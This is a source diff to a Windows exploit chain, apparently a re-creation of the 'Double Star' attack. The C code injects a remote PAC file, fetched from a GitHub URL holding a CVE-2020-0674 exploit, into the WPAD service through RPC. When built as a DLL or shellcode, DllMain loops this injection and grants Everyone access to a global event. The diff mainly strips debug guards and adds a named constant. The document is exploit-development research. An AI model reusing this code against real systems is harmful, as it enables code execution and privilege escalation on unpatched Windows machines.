@@ -34,6 +34,7 @@ BOOL SetObjectAclAllAccess(HANDLE hObject, wchar_t* SID, SE_OBJECT_TYPE ObjectTy
 #define SHELLCODE_BUILD
 #define SPOOL_SYNC
 #define TARGET_PAC_URL L"https://raw.githubusercontent.com/forrest-orr/ExploitDev/master/Exploits/Re-creations/Internet%20Explorer/CVE-2020-0674/x64/Forrest_Orr_CVE-2020-0674_64-bit.pac"
+#define SYNC_EVENT_NAME L"Global\\DoubleStarEvent"
 
 ////////
 ////////
@@ -102,9 +103,8 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
     // Make a unique variation of the specified PAC URL to avoid WPAD cache issues
 
     _snwprintf_s(pAutoConfigUrl, dwAutoConfigUrlLen, dwAutoConfigUrlLen, L"%ws?%lld", PacUrl, __rdtsc());
-#ifdef DEBUG
     DebugLog(L"... target PAC URL: %ws", pAutoConfigUrl);
-#endif
+
     // Create the configuration structs used in invoking the GetProxyForUrl method
 
     ProxyResolveUrl.Url = L"http://www.google.com/"; // This may vary, any URL will do since the PAC will not end up configuring a proxy for it anyway and it is the PAC execution itself which yields value
@@ -145,9 +145,8 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
                 RpcAsyncState.u.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL); // https://docs.microsoft.com/en-us/windows/desktop/api/rpcasync/ns-rpcasync-_rpc_async_state
 
                 RpcTryExcept {
-#ifdef DEBUG
                     DebugLog(L"... calling GetProxyForUrl RPC method.");
-#endif
+
                     GetProxyForUrl(
                         &RpcAsyncState,
                         hRpcBinding,
@@ -163,10 +162,7 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
                     );
                 }
                 RpcExcept(1) {
-                    //RpcStatus = RpcExceptionCode();
-#ifdef DEBUG
                     DebugLog(L"... GetProxyForUrl failed. Error: 0x%x", RpcExceptionCode());
-#endif
                 }
                 RpcEndExcept
 
@@ -180,32 +176,24 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
                     //RpcAsyncCompleteCall(&RpcAsyncState, &nReply); // This may crash with exception RPC_S_INTERNAL_ERROR in some cases. When repetition is needed it wrecks the exploit chain.
                 }
                 else {
-#ifdef DEBUG
                     DebugLog(L"... RPC call to WPAD GetProxyForUrl async event wait failed (error 0x%08x)\r\n", dwWaitResult);
-#endif
                     RpcAsyncCancelCall(&RpcAsyncState, TRUE);
                 }
             }
             else {
-#ifdef DEBUG
                 DebugLog(L"... RpcAsyncInitializeHandle failed. Error: 0x%x", RpcStatus);
-#endif
             }
 
             RpcBindingFree(&hRpcBinding);
         }
         else {
-#ifdef DEBUG
             DebugLog(L"... RpcBindingFromStringBindingW failed. Error: 0x%x", RpcStatus);
-#endif
         }
 
         RpcStringFreeW(&StringBinding);
     }
     else {
-#ifdef DEBUG
         DebugLog(L"... RpcStringBindingCompose failed. Error: 0x%x", RpcStatus);
-#endif
     }
 
     HeapFree(GetProcessHeap(), 0, pAutoConfigUrl);
@@ -216,9 +204,7 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
 #ifdef DLL_BUILD
 BOOL DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
     HANDLE hEvent;
-#ifdef DEBUG
-    DebugLog(L"... DllMain executed");
-#endif
+
     switch (dwReason) {
         case DLL_PROCESS_ATTACH: 
 #ifdef SHELLCODE_BUILD
@@ -247,11 +233,10 @@ BOOL DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
             4. Terminates itself.
             */
 
-            if ((hEvent = CreateEventW(NULL, TRUE, FALSE, L"Global\\DoubleStarEvent")) != NULL) {
+            if ((hEvent = CreateEventW(NULL, TRUE, FALSE, SYNC_EVENT_NAME)) != NULL) {
                 if (SetObjectAclAllAccess(hEvent, L"S-1-1-0", SE_KERNEL_OBJECT)) {
-#ifdef DEBUG
                     DebugLog(L"... successfully set Everyone ACL on event object");
-#endif
+
                     while (TRUE) {
                         DebugLog(L"... sending PAC update RPC signal to WPAD for %ws...", TARGET_PAC_URL);
                         RPC_STATUS RpcStatus = WpadInjectPac(TARGET_PAC_URL);
@@ -321,7 +306,7 @@ int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
 #ifdef SPOOL_SYNC
         HANDLE hEvent;
 
-        if ((hEvent = CreateEventW(NULL, TRUE, FALSE, L"Global\\DoubleStarEvent")) != NULL) {
+        if ((hEvent = CreateEventW(NULL, TRUE, FALSE, SYNC_EVENT_NAME)) != NULL) {
             if (SetObjectAclAllAccess(hEvent, L"S-1-1-0", SE_KERNEL_OBJECT)) {
                 DebugLog(L"... successfully set Everyone ACL on event object");
 
